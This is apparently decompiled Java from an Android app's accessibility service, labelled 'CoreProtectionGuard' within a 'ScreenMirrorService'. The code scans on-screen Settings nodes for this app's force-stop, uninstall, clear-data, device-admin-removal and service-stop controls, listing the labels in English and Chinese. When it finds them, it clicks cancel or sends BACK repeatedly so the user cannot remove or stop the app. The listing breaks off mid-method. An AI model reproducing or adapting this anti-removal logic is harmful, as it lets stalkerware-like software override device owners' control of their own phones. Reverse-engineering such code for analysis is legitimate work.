// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package x1;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcelable;
import android.os.SystemClock;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import e2.n1;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import lyr.stable.runtime.ScreenMirrorService;
import w1.kc;
import w1.le;
import w1.o2;
import w1.vf;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final class g {

    /* JADX INFO: renamed from: w, reason: collision with root package name */
    public static final String[] f5854w = {"com.android.settings:id/forcestop_button", "com.android.settings:id/force_stop_button", "com.android.settings:id/uninstall_button"};

    /* JADX INFO: renamed from: x, reason: collision with root package name */
    public static final String[] f5855x = {"Force stop", "Uninstall", "Clear data", "Clear storage", "Disable service", "Turn off", "强行停止", "强制停止", "卸载", "清除数据", "清除存储", "停用服务", "关闭"};

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public final ScreenMirrorService f5856a;

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public final d0.d f5857b = new d0.d();

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final n1 f5858c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public final y.e f5859d;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public final d f5860e;

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public final Object f5861f;

    /* JADX INFO: renamed from: g, reason: collision with root package name */
    public final AtomicBoolean f5862g;

    /* JADX INFO: renamed from: h, reason: collision with root package name */
    public final AtomicBoolean f5863h;

    /* JADX INFO: renamed from: i, reason: collision with root package name */
    public final AtomicInteger f5864i;

    /* JADX INFO: renamed from: j, reason: collision with root package name */
    public final AtomicLong f5865j;

    /* JADX INFO: renamed from: k, reason: collision with root package name */
    public volatile boolean f5866k;

    /* JADX INFO: renamed from: l, reason: collision with root package name */
    public volatile boolean f5867l;

    /* JADX INFO: renamed from: m, reason: collision with root package name */
    public volatile boolean f5868m;
    public ScheduledExecutorService n;

    /* JADX INFO: renamed from: o, reason: collision with root package name */
    public volatile ScheduledFuture f5869o;

    /* JADX INFO: renamed from: p, reason: collision with root package name */
    public volatile ScheduledFuture f5870p;

    /* JADX INFO: renamed from: q, reason: collision with root package name */
    public volatile z1.b f5871q;

    /* JADX INFO: renamed from: r, reason: collision with root package name */
    public volatile long f5872r;

    /* JADX INFO: renamed from: s, reason: collision with root package name */
    public volatile String f5873s;

    /* JADX INFO: renamed from: t, reason: collision with root package name */
    public volatile String f5874t;

    /* JADX INFO: renamed from: u, reason: collision with root package name */
    public volatile String f5875u;

    /* JADX INFO: renamed from: v, reason: collision with root package name */
    public volatile String f5876v;

    public g(ScreenMirrorService screenMirrorService) {
        z1.a aVar = z1.a.f6296c;
        aVar.getClass();
        this.f5858c = new n1(new z1.a(Integer.MAX_VALUE, aVar.f6298b));
        this.f5859d = new y.e();
        this.f5860e = new d(this, 1);
        this.f5861f = new Object();
        this.f5862g = new AtomicBoolean();
        this.f5863h = new AtomicBoolean();
        this.f5864i = new AtomicInteger();
        this.f5865j = new AtomicLong();
        this.f5866k = true;
        this.f5867l = true;
        this.f5873s = "";
        this.f5874t = "";
        this.f5875u = "";
        this.f5876v = "";
        this.f5856a = screenMirrorService;
    }

    public static boolean B(AccessibilityNodeInfo accessibilityNodeInfo, z1.p pVar, int i3, c2.t tVar) {
        AccessibilityNodeInfo child;
        long j3 = tVar.f459b;
        if (accessibilityNodeInfo != null && i3 <= 5) {
            int i4 = tVar.f458a;
            tVar.f458a = i4 + 1;
            if (i4 < 64 && System.nanoTime() - j3 < 2000000) {
                try {
                    if (pVar.h(accessibilityNodeInfo.getText()) || pVar.h(accessibilityNodeInfo.getContentDescription())) {
                        return true;
                    }
                } catch (Throwable unused) {
                }
                try {
                    int iMin = Math.min(accessibilityNodeInfo.getChildCount(), 24);
                    for (int i5 = 0; i5 < iMin && tVar.f458a < 64 && System.nanoTime() - j3 < 2000000; i5++) {
                        try {
                            child = accessibilityNodeInfo.getChild(i5);
                            try {
                                if (B(child, pVar, i3 + 1, tVar)) {
                                    p(child);
                                    return true;
                                }
                            } catch (Throwable unused2) {
                            }
                        } catch (Throwable unused3) {
                            child = null;
                        }
                        p(child);
                    }
                } catch (Throwable unused4) {
                }
            }
        }
        return false;
    }

    public static String C(CharSequence charSequence) {
        return charSequence == null ? "" : charSequence.toString();
    }

    public static z1.g d(AccessibilityNodeInfo accessibilityNodeInfo, int i3, c2.t tVar) {
        int i4;
        AccessibilityNodeInfo child;
        long j3 = tVar.f459b;
        if (accessibilityNodeInfo != null && i3 <= 28) {
            int i5 = tVar.f458a;
            tVar.f458a = i5 + 1;
            if (i5 < 384 && System.nanoTime() - j3 < 6000000) {
                d.b bVar = new d.b();
                ArrayList arrayList = (ArrayList) bVar.f511f;
                bVar.f506a = C(accessibilityNodeInfo.getPackageName());
                bVar.f512g = C(accessibilityNodeInfo.getClassName());
                bVar.f513h = C(accessibilityNodeInfo.getViewIdResourceName());
                bVar.f514i = C(accessibilityNodeInfo.getText());
                bVar.f515j = C(accessibilityNodeInfo.getContentDescription());
                bVar.f507b = accessibilityNodeInfo.isVisibleToUser();
                bVar.f509d = accessibilityNodeInfo.isEnabled();
                bVar.f510e = accessibilityNodeInfo.isClickable();
                String lowerCase = C(accessibilityNodeInfo.getClassName()).toLowerCase(Locale.ROOT);
                if (lowerCase.contains("dialog")) {
                    i4 = 6;
                } else if (lowerCase.contains("button")) {
                    i4 = 4;
                } else if (lowerCase.contains("switch") || lowerCase.contains("checkbox")) {
                    i4 = 5;
                } else if (lowerCase.contains("text")) {
                    i4 = 3;
                } else {
                    i4 = accessibilityNodeInfo.getChildCount() > 0 ? 2 : 1;
                }
                bVar.f508c = i4;
                f fVarV = v(accessibilityNodeInfo.getExtras());
                bVar.f516k = fVarV.f5852a;
                bVar.f517l = fVarV.f5853b;
                int iMin = Math.min(accessibilityNodeInfo.getChildCount(), 64);
                int i6 = 0;
                for (int i7 = 384; i6 < iMin && tVar.f458a < i7 && System.nanoTime() - j3 < 6000000; i7 = 384) {
                    try {
                        child = accessibilityNodeInfo.getChild(i6);
                        try {
                            arrayList.add(d(child, i3 + 1, tVar));
                        } catch (Throwable unused) {
                            try {
                                d.b bVar2 = new d.b();
                                bVar2.f507b = false;
                                arrayList.add(new z1.g(bVar2));
                            } catch (Throwable th) {
                                p(child);
                                throw th;
                            }
                        }
                    } catch (Throwable unused2) {
                        child = null;
                    }
                    p(child);
                    i6++;
                }
                return new z1.g(bVar);
            }
        }
        d.b bVar3 = new d.b();
        bVar3.f507b = false;
        return new z1.g(bVar3);
    }

    public static boolean h(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        if (str != null && !str.trim().isEmpty()) {
            try {
                listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
                if (listFindAccessibilityNodeInfosByText == null) {
                    q(listFindAccessibilityNodeInfosByText);
                    return false;
                }
                try {
                    for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByText) {
                        if (accessibilityNodeInfo2 != null && accessibilityNodeInfo2.isVisibleToUser()) {
                            q(listFindAccessibilityNodeInfosByText);
                            return true;
                        }
                    }
                    q(listFindAccessibilityNodeInfosByText);
                    return false;
                } catch (Throwable unused) {
                    q(listFindAccessibilityNodeInfosByText);
                    return false;
                }
            } catch (Throwable unused2) {
                listFindAccessibilityNodeInfosByText = null;
            }
        }
        return false;
    }

    public static boolean i(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId;
        try {
            listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str);
            if (listFindAccessibilityNodeInfosByViewId == null) {
                q(listFindAccessibilityNodeInfosByViewId);
                return false;
            }
            try {
                for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByViewId) {
                    if (accessibilityNodeInfo2 != null && accessibilityNodeInfo2.isVisibleToUser()) {
                        q(listFindAccessibilityNodeInfosByViewId);
                        return true;
                    }
                }
                q(listFindAccessibilityNodeInfosByViewId);
                return false;
            } catch (Throwable unused) {
                q(listFindAccessibilityNodeInfosByViewId);
                return false;
            }
        } catch (Throwable unused2) {
            listFindAccessibilityNodeInfosByViewId = null;
        }
    }

    public static boolean m(String str) {
        return str != null && str.indexOf(46) > 0 && str.indexOf(32) < 0 && str.length() < 180;
    }

    public static void p(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        try {
            accessibilityNodeInfo.recycle();
        } catch (Throwable unused) {
        }
    }

    public static void q(List list) {
        if (list == null) {
            return;
        }
        Iterator it = list.iterator();
        while (it.hasNext()) {
            p((AccessibilityNodeInfo) it.next());
        }
    }

    public static f v(Bundle bundle) {
        String str;
        String str2;
        String str3 = "";
        if (bundle == null || bundle.isEmpty()) {
            return f.f5851c;
        }
        try {
            str2 = "";
            str = str2;
            for (String str4 : bundle.keySet()) {
                try {
                    if (str4 != null) {
                        String lowerCase = str4.toLowerCase(Locale.ROOT);
                        if (lowerCase.contains("package") || lowerCase.contains("component")) {
                            Object obj = bundle.get(str4);
                            String strTrim = obj == null ? "" : obj.toString().trim();
                            if (lowerCase.contains("component") && strTrim.contains("/")) {
                                str = strTrim;
                            } else if (lowerCase.contains("package") && m(strTrim)) {
                                str2 = strTrim;
                            }
                        }
                    }
                } catch (Throwable unused) {
                    str3 = str2;
                    str2 = str3;
                }
            }
        } catch (Throwable unused2) {
            str = "";
        }
        return new f(str2, str);
    }

    public final void A() {
        this.f5865j.incrementAndGet();
        this.f5866k = false;
        c();
        e();
        synchronized (this.f5861f) {
            try {
                ScheduledFuture scheduledFuture = this.f5869o;
                if (scheduledFuture != null) {
                    scheduledFuture.cancel(false);
                }
                ScheduledFuture scheduledFuture2 = this.f5870p;
                if (scheduledFuture2 != null) {
                    scheduledFuture2.cancel(false);
                }
                this.f5869o = null;
                this.f5870p = null;
                ScheduledExecutorService scheduledExecutorService = this.n;
                this.n = null;
                if (scheduledExecutorService != null) {
                    scheduledExecutorService.shutdownNow();
                    Log.i("CoreProtectionGuard", "continuous sample-style polling stopped");
                }
            } catch (Throwable th) {
                throw th;
            }
        }
        y.e eVar = this.f5859d;
        synchronized (eVar) {
            eVar.f5976c = null;
            eVar.f5977d = null;
        }
    }

    public final boolean a(long j3) {
        return this.f5865j.get() == j3 && this.f5866k && !this.f5868m && this.f5867l;
    }

    public final void b(long j3) {
        if (a(j3)) {
            long jUptimeMillis = SystemClock.uptimeMillis();
            if (this.f5871q == null || !this.f5871q.f6299a) {
                Object obj = this.f5858c.f905c;
                long jR = n1.r(jUptimeMillis, 30000L);
                this.f5871q = new z1.b(true, jUptimeMillis, jR, Math.min(jR, n1.r(jUptimeMillis, 100L)), 0, 0, 0, 1);
            }
            this.f5871q = this.f5858c.f(this.f5871q, jUptimeMillis, true);
            if (a(j3)) {
                s();
            } else {
                e();
            }
        }
    }

    public final void c() {
        ScheduledFuture scheduledFuture = this.f5870p;
        if (scheduledFuture != null) {
            scheduledFuture.cancel(false);
        }
        this.f5870p = null;
        this.f5863h.set(false);
        this.f5875u = "";
        this.f5876v = "";
        this.f5864i.incrementAndGet();
    }

    public final void e() {
        ScheduledFuture scheduledFuture = this.f5869o;
        if (scheduledFuture != null) {
            scheduledFuture.cancel(false);
        }
        this.f5869o = null;
        z1.b bVarT = this.f5871q;
        if (bVarT != null) {
            this.f5858c.getClass();
            if (bVarT.f6299a) {
                bVarT = n1.t(bVarT, 4);
            }
            this.f5871q = bVarT;
        }
    }

    /* JADX WARN: Code duplicated, block: B:31:0x0054  */
    public final boolean f(AccessibilityNodeInfo accessibilityNodeInfo, int i3, int i4, z1.d dVar, long j3) {
        boolean z2;
        AccessibilityNodeInfo child;
        if (a(j3)) {
            if (i3 == 1) {
                AccessibilityNodeInfo accessibilityNodeInfo2 = null;
                if (accessibilityNodeInfo != null && dVar != null) {
                    AccessibilityNodeInfo accessibilityNodeInfoObtain = AccessibilityNodeInfo.obtain(accessibilityNodeInfo);
                    int i5 = 0;
                    while (true) {
                        int[] iArr = dVar.f6311a;
                        if (i5 >= iArr.length) {
                            accessibilityNodeInfo2 = accessibilityNodeInfoObtain;
                            break;
                        }
                        try {
                            child = accessibilityNodeInfoObtain.getChild(iArr[i5]);
                        } catch (Throwable unused) {
                            child = null;
                        }
                        p(accessibilityNodeInfoObtain);
                        if (child == null) {
                            break;
                        }
                        i5++;
                        accessibilityNodeInfoObtain = child;
                    }
                }
                if (accessibilityNodeInfo2 != null) {
                    try {
                        if (accessibilityNodeInfo2.isVisibleToUser() && accessibilityNodeInfo2.isEnabled() && this.f5857b.f(accessibilityNodeInfo2, 16, new e(this, j3, 1))) {
                            z2 = true;
                        } else {
                            z2 = false;
                        }
                    } catch (Throwable unused2) {
                        p(accessibilityNodeInfo2);
                        z2 = false;
                    }
                } else {
                    z2 = false;
                }
                p(accessibilityNodeInfo2);
                if (z2) {
                    this.f5872r = SystemClock.uptimeMillis();
                    return true;
                }
                i3 = i4;
            }
            if (i3 == 2) {
                this.f5872r = SystemClock.uptimeMillis();
                return n(j3, 0L);
            }
            if (i3 == 3) {
                this.f5872r = SystemClock.uptimeMillis();
                return this.f5857b.d(this.f5856a, 2, new e(this, j3, 2));
            }
        }
        return false;
    }

    public final void g(AccessibilityNodeInfo accessibilityNodeInfo, int i3, int i4, z1.d dVar, boolean z2, long j3) {
        if (a(j3)) {
            long jUptimeMillis = SystemClock.uptimeMillis();
            if ((z2 || this.f5872r <= 0 || jUptimeMillis < this.f5872r || jUptimeMillis - this.f5872r >= 250) && f(accessibilityNodeInfo, i3, i4, dVar, j3)) {
                this.f5872r = jUptimeMillis;
            }
        }
    }

    public final boolean j(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId;
        if (accessibilityNodeInfo != null) {
            CharSequence packageName = accessibilityNodeInfo.getPackageName();
            if (packageName == null) {
                string = "";
            } else {
                Set set = z1.f.f6313a;
                string = packageName.toString();
            }
            if (z1.f.a(z1.f.d(string)) == 1) {
                z1.p pVarK = this.f5859d.k(this.f5856a, new ComponentName[0]);
                if (pVarK.f6359a) {
                    try {
                        listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId("com.android.settings:id/entity_header_title");
                        if (listFindAccessibilityNodeInfosByViewId == null) {
                            q(listFindAccessibilityNodeInfosByViewId);
                        } else {
                            try {
                                for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByViewId) {
                                    if (accessibilityNodeInfo2 != null && accessibilityNodeInfo2.isVisibleToUser() && (pVarK.h(accessibilityNodeInfo2.getText()) || pVarK.h(accessibilityNodeInfo2.getContentDescription()))) {
                                        q(listFindAccessibilityNodeInfosByViewId);
                                        for (int i3 = 0; i3 < 3; i3++) {
                                            if (i(accessibilityNodeInfo, f5854w[i3])) {
                                                return true;
                                            }
                                        }
                                    }
                                }
                            } catch (Throwable unused) {
                            }
                            q(listFindAccessibilityNodeInfosByViewId);
                        }
                    } catch (Throwable unused2) {
                        listFindAccessibilityNodeInfosByViewId = null;
                    }
                }
            }
        }
        return false;
    }

    /* JADX WARN: Code duplicated, block: B:43:0x00f6  */
    /* JADX WARN: Code duplicated, block: B:79:0x01b8  */
    public final vf k(z1.k kVar) {
        boolean z2;
        boolean z3;
        boolean z4;
        int i3;
        int i4;
        int iG;
        z1.j jVar;
        int i5;
        String str;
        String str2;
        z1.e eVar;
        String str3;
        String str4;
        z1.c cVar;
        ArrayDeque arrayDeque;
        z1.d dVar;
        int i6;
        char c3;
        int i7;
        int i8;
        char c4 = 0;
        z1.p pVarK = this.f5859d.k(this.f5856a, new ComponentName[0]);
        z1.j jVar2 = new z1.j(((z1.a) this.f5858c.f905c).f6298b);
        Set set = z1.f.f6313a;
        z1.g gVar = kVar.f6339e;
        String str5 = kVar.f6338d;
        String str6 = kVar.f6337c;
        if (pVarK == null || !pVarK.f6359a) {
            return z1.f.e(jVar2);
        }
        String strD = z1.f.d(kVar.f6335a);
        if (strD.isEmpty() && gVar != null) {
            strD = z1.f.d(gVar.f6316a);
        }
        int iA = z1.f.a(strD);
        if (iA == 5) {
            return z1.f.e(jVar2);
        }
        if (!str6.isEmpty() && !pVarK.g(str6)) {
            return z1.f.e(jVar2);
        }
        if (!str5.isEmpty() && !pVarK.f(str5)) {
            return z1.f.e(jVar2);
        }
        int i9 = 1;
        if ("com.miui.securitycenter".equals(strD)) {
            jVar2.b();
            return new vf(10, 2, 3, 2, 1, (z1.d) null);
        }
        String str7 = pVarK.f6360b;
        ArrayList arrayList = new ArrayList();
        ArrayList arrayList2 = new ArrayList();
        z1.e eVar2 = null;
        if (gVar == null) {
            z2 = false;
            z3 = false;
            z4 = false;
            i3 = 0;
            jVar = jVar2;
            str = str5;
            str2 = str6;
            i5 = iA;
            eVar = null;
            i4 = 8;
            iG = 8;
        } else {
            ArrayDeque arrayDeque2 = new ArrayDeque();
            arrayDeque2.push(new z1.c(gVar, z1.d.f6310b, 0));
            z2 = false;
            z3 = false;
            z4 = false;
            i3 = 0;
            int iF = 1;
            i4 = 8;
            iG = 8;
            while (!arrayDeque2.isEmpty() && !jVar2.a()) {
                z1.c cVar2 = (z1.c) arrayDeque2.pop();
                int i10 = cVar2.f6309c;
                iA = iA;
                z1.d dVar2 = cVar2.f6308b;
                if (i10 >= 0) {
                    jVar2.f6329a.getClass();
                    if (i10 > 32) {
                        str3 = str5;
                    } else {
                        str3 = str5;
                        if (jVar2.f6331c >= 512) {
                            jVar2.f6333e = true;
                        } else {
                            String str8 = str6;
                            long jNanoTime = System.nanoTime() - jVar2.f6330b;
                            if (jNanoTime < 0) {
                                jNanoTime = Long.MAX_VALUE;
                            }
                            if (jNanoTime >= 8000000) {
                                jVar2.f6334f = true;
                                str4 = str8;
                                jVar2 = jVar2;
                                arrayDeque2 = arrayDeque2;
                                str5 = str3;
                                str6 = str4;
                                jVar2 = jVar2;
                            } else {
                                jVar2.f6331c++;
                                jVar2.f6332d = Math.max(jVar2.f6332d, i10);
                                z1.g gVar2 = cVar2.f6307a;
                                z1.e eVar3 = new z1.e(dVar2);
                                boolean z5 = gVar2.f6324i;
                                String str9 = gVar2.f6318c;
                                String str10 = gVar2.f6320e;
                                z1.j jVar3 = jVar2;
                                String str11 = gVar2.f6319d;
                                String str12 = gVar2.f6322g;
                                ArrayDeque arrayDeque3 = arrayDeque2;
                                String str13 = gVar2.f6321f;
                                if (z5) {
                                    int iF2 = z1.f.f(z1.f.f(pVarK.d(str13, str12), pVarK.e(str11)), pVarK.e(str10));
                                    if (iF2 != 1) {
                                        iF = z1.f.f(iF, iF2);
                                        arrayList.add(eVar3);
                                    }
                                    if (!str13.isEmpty()) {
                                        if (pVarK.g(str13)) {
                                            z3 = true;
                                        } else {
                                            z2 = true;
                                        }
                                    }
                                    if (!str12.isEmpty()) {
                                        if (pVarK.f(str12)) {
                                            z3 = true;
                                        } else {
                                            z2 = true;
                                        }
                                    }
                                    if (gVar2.f6323h == 6) {
                                        z4 = true;
                                    }
                                    if (z1.f.b(gVar2)) {
                                        i3++;
                                        if (z1.f.b(gVar2)) {
                                            String strD2 = z1.f.d(str9);
                                            int iLastIndexOf = strD2.lastIndexOf(47);
                                            if (iLastIndexOf >= 0) {
                                                strD2 = strD2.substring(iLastIndexOf + 1);
                                            }
                                            if (strD2.equals("cancel_button") || strD2.equals("btn_cancel") || strD2.equals("action_cancel") || strD2.equals("negative_button") || strD2.equals("keep_button")) {
                                                c3 = 3;
                                            } else if (strD2.equals("button2")) {
                                                c3 = 2;
                                            } else {
                                                Map map = z1.m.f6348a;
                                                String strM = m0.a.m(str11);
                                                if (strM.isEmpty() || !z1.m.b(str7).f6347h.contains(strM)) {
                                                    String strM2 = m0.a.m(str10);
                                                    if (strM2.isEmpty() || !z1.m.b(str7).f6347h.contains(strM2)) {
                                                        c3 = 0;
                                                    }
                                                }
                                                c3 = 1;
                                            }
                                        } else {
                                            c3 = 0;
                                        }
                                        if (c3 > c4) {
                                            if (c3 > 0) {
                                                eVar2 = eVar3;
                                            }
                                            c4 = c3;
                                        }
                                    }
                                    String strD3 = z1.f.d(str9);
                                    if ("com.android.systemui:id/fgs_manager_app_item_stop_button".equals(strD3)) {
                                        arrayList2.add(eVar3);
                                    }
                                    String strD4 = z1.f.d(strD3);
                                    int iLastIndexOf2 = strD4.lastIndexOf(47);
                                    if (iLastIndexOf2 >= 0) {
                                        strD4 = strD4.substring(iLastIndexOf2 + 1);
                                    }
                                    if (strD4.equals("uninstall_button") || strD4.equals("action_uninstall") || strD4.equals("uninstall_app") || strD4.equals("delete_button") || strD4.equals("button_uninstall")) {
                                        i6 = 1;
                                    } else if (strD4.equals("disable_button") || strD4.equals("action_disable") || strD4.equals("button_disable")) {
                                        i6 = 2;
                                    } else if (strD4.equals("force_stop_button") || strD4.equals("forcestop_button") || strD4.equals("force_stop") || strD4.equals("force_stop_btn") || strD4.equals("button_force_stop")) {
                                        i6 = 3;
                                    } else if (strD4.equals("clear_data_button") || strD4.equals("clear_storage_button") || strD4.equals("clear_data") || strD4.equals("clear_storage") || strD4.equals("button_clear_data")) {
                                        i6 = 4;
                                    } else if (strD4.equals("storage_settings") || strD4.equals("storage_button") || strD4.equals("storage_and_cache")) {
                                        i6 = 5;
                                    } else if (strD4.equals("deactivate_button") || strD4.equals("remove_admin_button") || strD4.equals("remove_device_admin") || strD4.equals("button_deactivate")) {
                                        i6 = 6;
                                    } else {
                                        i6 = "com.android.systemui:id/fgs_manager_app_item_stop_button".equals(z1.f.d(strD3)) ? 7 : 8;
                                    }
                                    int iG2 = z1.f.g(i4, i6);
                                    iG = z1.f.g(iG, z1.f.g(z1.m.a(str11, str7), z1.m.a(str10, str7)));
                                    i4 = iG2;
                                }
                                List list = gVar2.f6327l;
                                int size = list.size() - 1;
                                while (size >= 0) {
                                    z1.g gVar3 = (z1.g) list.get(size);
                                    if (gVar3 != null) {
                                        dVar = dVar2;
                                        int[] iArr = dVar.f6311a;
                                        int[] iArrCopyOf = Arrays.copyOf(iArr, iArr.length + 1);
                                        iArrCopyOf[iArr.length] = size;
                                        z1.d dVar3 = new z1.d(iArrCopyOf);
                                        cVar = cVar2;
                                        z1.c cVar3 = new z1.c(gVar3, dVar3, cVar.f6309c + 1);
                                        arrayDeque = arrayDeque3;
                                        arrayDeque.push(cVar3);
                                    } else {
                                        cVar = cVar2;
                                        arrayDeque = arrayDeque3;
                                        dVar = dVar2;
                                    }
                                    size--;
                                    arrayDeque3 = arrayDeque;
                                    dVar2 = dVar;
                                    cVar2 = cVar;
                                }
                                str5 = str3;
                                str6 = str8;
                                jVar2 = jVar3;
                                arrayDeque2 = arrayDeque3;
                            }
                        }
                    }
                    str4 = str6;
                    arrayDeque2 = arrayDeque2;
                    str5 = str3;
                    str6 = str4;
                    jVar2 = jVar2;
                } else {
                    str3 = str5;
                    str4 = str6;
                    arrayDeque2 = arrayDeque2;
                    str5 = str3;
                    str6 = str4;
                    jVar2 = jVar2;
                }
            }
            jVar = jVar2;
            i5 = iA;
            i9 = iF;
            str = str5;
            str2 = str6;
            eVar = eVar2;
        }
        int iF3 = z1.f.f(pVarK.d(str2, str), i9);
        if (iF3 == 1) {
            return z1.f.e(jVar);
        }
        if (str2.isEmpty() && str.isEmpty() && z2 && !z3) {
            return z1.f.e(jVar);
        }
        String strD5 = z1.f.d(kVar.f6336b);
        boolean z6 = strD5.contains("installedappdetails") || strD5.contains("appinfodetails") || strD5.contains("applicationsdetails") || strD5.contains("appdetailsactivity") || strD5.contains("appinfopage") || strD5.contains("manageapplications$appinfo") || strD5.endsWith(".spaactivity");
        boolean z7 = strD5.contains("appstoragesettings") || strD5.contains("storageusedetails") || strD5.contains("appstorageactivity");
        boolean z8 = strD5.contains("deviceadminadd") || strD5.contains("deviceadmindetails") || strD5.contains("deviceadminsettings") || strD5.contains("removeadmin");
        boolean z9 = strD5.contains("uninstaller") || strD5.contains("uninstallactivity") || strD5.contains("deletepackage") || strD5.contains("packagedelete") || strD5.contains("uninstallappprogress");
        boolean z10 = strD5.contains("alertdialog") || strD5.endsWith("dialog") || strD5.contains("$dialog") || z4 || i3 > 0;
        int i11 = 6;
        int i12 = i5;
        if (i12 == 4 && !arrayList2.isEmpty()) {
            if (!pVarK.g(str2)) {
                int size2 = arrayList2.size();
                int i13 = 0;
                while (i13 < size2) {
                    Object obj = arrayList2.get(i13);
                    i13++;
                    z1.e eVar4 = (z1.e) obj;
                    int size3 = arrayList.size();
                    int i14 = 0;
                    while (i14 < size3) {
                        Object obj2 = arrayList.get(i14);
                        i14++;
                        z1.d dVar4 = eVar4.f6312a;
                        z1.d dVar5 = ((z1.e) obj2).f6312a;
                        int[] iArr2 = dVar4.f6311a;
                        int length = iArr2.length;
                        int[] iArr3 = dVar5.f6311a;
                        int iMin = Math.min(length, iArr3.length);
                        int i15 = 0;
                        while (i15 < iMin && iArr2[i15] == iArr3[i15]) {
                            i15++;
                        }
                        int length2 = iArr2.length - i15;
                        int length3 = iArr3.length - i15;
                        if (i15 == 0) {
                            if (length2 > 1 || length3 > 1) {
                            }
                        } else if (length2 > 3 || length3 > 3) {
                        }
                    }
                }
                return z1.f.e(jVar);
            }
            jVar.b();
            return new vf(9, 2, 4, 1, iF3, (z1.d) null);
        }
        if (i12 != 2) {
            i7 = 2;
        } else {
            if (z9 || i4 == 1) {
                if (eVar == null) {
                    jVar.b();
                    return new vf(8, 2, 4, 2, iF3, (z1.d) null);
                }
                z1.d dVar6 = eVar.f6312a;
                jVar.b();
                return new vf(8, 1, 2, 2, iF3, dVar6);
            }
            i7 = 2;
        }
        if (z8 && (i4 == 6 || iG == 6)) {
            int i16 = i4 == 6 ? 1 : 3;
            if (eVar == null) {
                jVar.b();
                return new vf(7, i7, 4, i16, iF3, (z1.d) null);
            }
            z1.d dVar7 = eVar.f6312a;
            jVar.b();
            return new vf(7, (int) r18, i7, i16, iF3, dVar7);
        }
        if (i4 != 8) {
            switch (g.d.a(i4)) {
                case 0:
                    i8 = 2;
                    break;
                case 1:
                    i8 = 3;
                    break;
                case 2:
                    i8 = 4;
                    break;
                case 3:
                    i8 = 5;
                    break;
                case 4:
                    i8 = 6;
                    break;
                case 5:
                    i8 = 7;
                    break;
                case 6:
                    i8 = 9;
                    break;
                default:
                    i8 = 11;
                    break;
            }
            if (i8 != 11) {
                if ((!z10 && eVar == null) || i8 == 6) {
                    int i17 = i8;
                    int i18 = i7;
                    jVar.b();
                    return new vf(i17, i18, 4, 1, iF3, (z1.d) null);
                }
                if (eVar == null) {
                    jVar.b();
                    return new vf(i8, i7, 4, 1, iF3, (z1.d) null);
                }
                z1.d dVar8 = eVar.f6312a;
                jVar.b();
                return new vf(i8, (int) r18, i7, 1, iF3, dVar8);
            }
        }
        if (z7) {
            jVar.b();
            return new vf(6, i7, 4, 2, iF3, (z1.d) null);
        }
        if (z6) {
            jVar.b();
            return new vf(1, i7, 4, 2, iF3, (z1.d) null);
        }
        if (iG != 8 && z10) {
            switch (g.d.a(iG)) {
                case 0:
                    i11 = 2;
                    break;
                case 1:
                    i11 = 3;
                    break;
                case 2:
                    i11 = 4;
                    break;
                case 3:
                    i11 = 5;
                    break;
                case 4:
                    break;
                case 5:
                    i11 = 7;
                    break;
                case 6:
                    i11 = 9;
                    break;
                default:
                    i11 = 11;
                    break;
            }
            if (i11 != 11) {
                if (eVar == null) {
                    jVar.b();
                    return new vf(i11, i7, 4, 3, iF3, (z1.d) null);
                }
                z1.d dVar9 = eVar.f6312a;
                jVar.b();
                return new vf(i11, 1, i7, 3, iF3, dVar9);
            }
        }
        return z1.f.e(jVar);
    }

    public final boolean l(AccessibilityNodeInfo accessibilityNodeInfo) {
        boolean zH;
        if (z1.f.c(accessibilityNodeInfo.getPackageName())) {
            z1.p pVarK = this.f5859d.k(this.f5856a, new ComponentName[0]);
            if (pVarK.f6359a) {
                Iterator it = pVarK.f6361c.iterator();
                while (true) {
                    if (!it.hasNext()) {
                        zH = h(accessibilityNodeInfo, z1.p.f6357g);
                        break;
                    }
                    if (h(accessibilityNodeInfo, (String) it.next())) {
                        zH = true;
                        break;
                    }
                }
                if (zH) {
                    for (int i3 = 0; i3 < 13; i3++) {
                        if (h(accessibilityNodeInfo, f5855x[i3])) {
                            return true;
                        }
                    }
                    for (int i4 = 0; i4 < 3; i4++) {
                        if (i(accessibilityNodeInfo, f5854w[i4])) {
                            return true;
                        }
                    }
                }
            }
        }
        return false;
    }

    public final boolean n(long j3, long j4) {
        String str;
        if (!a(j3) || !this.f5862g.compareAndSet(false, true)) {
            return false;
        }
        if (j4 > 0) {
            try {
                str = " intervalMs=" + j4;
            } catch (Throwable th) {
                this.f5862g.set(false);
                throw th;
            }
        } else {
            str = "";
        }
        Log.i("CoreProtectionGuard", "BACK x3".concat(str));
